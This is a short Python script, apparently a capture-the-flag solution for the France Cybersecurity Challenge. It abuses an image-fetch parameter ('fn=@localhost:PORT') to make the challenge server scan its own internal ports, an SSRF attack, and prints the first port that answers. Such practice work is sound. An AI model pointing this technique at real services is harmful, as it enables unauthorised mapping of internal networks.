#!/usr/bin/env python3

import requests
import time

for i in range(0, 2000):
    url = 'http://challenges2.france-cybersecurity-challenge.fr:5002/api/image?fn=@localhost:'
    url += str(i)
    print(f'trying {url}')
    time.sleep(0.1)
    r = requests.get(url)
    if r.status_code != 500:
        print(f'success port = {i}')
        print(r.text)
        break
